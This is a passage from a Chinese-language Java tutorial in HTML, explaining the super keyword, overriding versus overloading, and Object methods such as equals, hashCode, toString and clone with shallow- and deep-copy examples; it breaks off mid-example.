函数访问父类的构造函数，从而委托父类完成一些初始化的工作。</li><li>访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SuperExample</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> y<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SuperExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SuperExample.func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SuperExtendExample</span> <span class="token keyword">extends</span> <span class="token class-name">SuperExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> z<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SuperExtendExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>z <span class="token operator">=</span> z<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SuperExtendExample.func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>SuperExample e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperExtendExample</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>e<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SuperExample<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>SuperExtendExample<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><a href="https://docs.oracle.com/javase/tutorial/java/IandI/super.html" target="_blank" rel="noopener">Using the Keyword super</a></p><h2 id="重写与重载"><a href="#重写与重载" class="headerlink" title="重写与重载"></a>重写与重载</h2><p><strong>1. 重写（Override）</strong></p><p>存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。</p><p>为了满足里式替换原则，重写有有以下两个限制：</p><ul><li>子类方法的访问权限必须大于等于父类方法；</li><li>子类方法的返回类型必须是父类方法返回类型或为其子类型。</li></ul><p>使用 @Override 注解，可以让编译器帮忙检查是否满足上面的两个限制条件。</p><p><strong>2. 重载（Overload）</strong></p><p>存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。</p><p>应该注意的是，返回值不同，其它都相同不算是重载。</p><h1 id="五、Object-通用方法"><a href="#五、Object-通用方法" class="headerlink" title="五、Object 通用方法"></a>五、Object 通用方法</h1><h2 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span><span class="token keyword">protected</span> <span class="token keyword">native</span> Object <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CloneNotSupportedException<span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">long</span> timeout<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">long</span> timeout<span class="token punctuation">,</span> <span class="token keyword">int</span> nanos<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException</code></pre><h2 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h2><p><strong>1. 等价关系</strong></p><p>Ⅰ 自反性</p><pre class=" language-java"><code class="language-java">x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p>Ⅱ 对称性</p><pre class=" language-java"><code class="language-java">x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> y<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p>Ⅲ 传递性</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span>    x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true;</span></code></pre><p>Ⅳ 一致性</p><p>多次调用 equals() 方法结果不变</p><pre class=" language-java"><code class="language-java">x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p>Ⅴ 与 null 的比较</p><p>对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false</p><pre class=" language-java"><code class="language-java">x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false;</span></code></pre><p><strong>2. 等价与相等</strong></p><ul><li>对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。</li><li>对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。</li></ul><pre class=" language-java"><code class="language-java">Integer x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Integer y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// false</span></code></pre><p><strong>3. 实现</strong></p><ul><li>检查是否为同一个对象的引用，如果是直接返回 true；</li><li>检查是否是同一个类型，如果不是，直接返回 false；</li><li>将 Object 对象进行转型；</li><li>判断每个关键域是否相等。</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EqualExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> y<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> z<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">EqualExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>z <span class="token operator">=</span> z<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> null <span class="token operator">||</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        EqualExample that <span class="token operator">=</span> <span class="token punctuation">(</span>EqualExample<span class="token punctuation">)</span> o<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> that<span class="token punctuation">.</span>x<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">!=</span> that<span class="token punctuation">.</span>y<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> z <span class="token operator">==</span> that<span class="token punctuation">.</span>z<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h2><p>hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。</p><p>在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。</p><p>下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象，但是因为 EqualExample 没有实现 hasCode() 方法，因此这两个对象的散列值是不同的，最终导致集合添加了两个等价的对象。</p><pre class=" language-java"><code class="language-java">EqualExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualExample</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EqualExample e2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualExample</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>e2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>HashSet<span class="token operator">&lt;</span>EqualExample<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>e1<span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>e2<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 2</span></code></pre><p>理想的散列函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。</p><p>一个数与 31 相乘可以转换成移位和减法：<code>31*x == (x&lt;&lt;5)-x</code>，编译器会自动进行这个优化。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">31</span> <span class="token operator">*</span> result <span class="token operator">+</span> x<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">31</span> <span class="token operator">*</span> result <span class="token operator">+</span> y<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">31</span> <span class="token operator">*</span> result <span class="token operator">+</span> z<span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h2><p>默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> number<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ToStringExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">=</span> number<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>ToStringExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringExample</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ToStringExample<span class="token annotation punctuation">@4554617c</span></code></pre><h2 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h2><p><strong>1. cloneable</strong></p><p>clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CloneExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span>CloneExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object'</span></code></pre><p>重写 clone() 得到以下实现：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CloneExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> CloneExample <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CloneNotSupportedException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>CloneExample<span class="token punctuation">)</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>CloneExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    CloneExample e2 <span class="token operator">=</span> e1<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>CloneNotSupportedException<span class="token operator">:</span> CloneExample</code></pre><p>以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。</p><p>应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CloneExample</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CloneNotSupportedException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>2. 浅拷贝</strong></p><p>拷贝对象和原始对象的引用类型引用同一个对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShallowCloneExample</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ShallowCloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> ShallowCloneExample <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CloneNotSupportedException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>ShallowCloneExample<span class="token punctuation">)</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>ShallowCloneExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShallowCloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ShallowCloneExample e2 <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    e2 <span class="token operator">=</span> e1<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>e1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 222</span></code></pre><p><strong>3. 深拷贝</strong></p><p>拷贝对象和原始对象的引用类型引用不同对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeepCloneExample</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">DeepCloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> DeepCloneExample <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> CloneNotSupportedException <span class="token punctuation">{</span>        DeepCloneExample result <span class="token operator">=</span> <span class="token punctuation">(</span>DeepCloneExample<span class="token punctuation">)</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span>arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>DeepCloneExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeepCloneExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DeepCloneExample e2 <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    e2 <span class="token operator">=</span> e1<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CloneNotSupportedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>e1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token 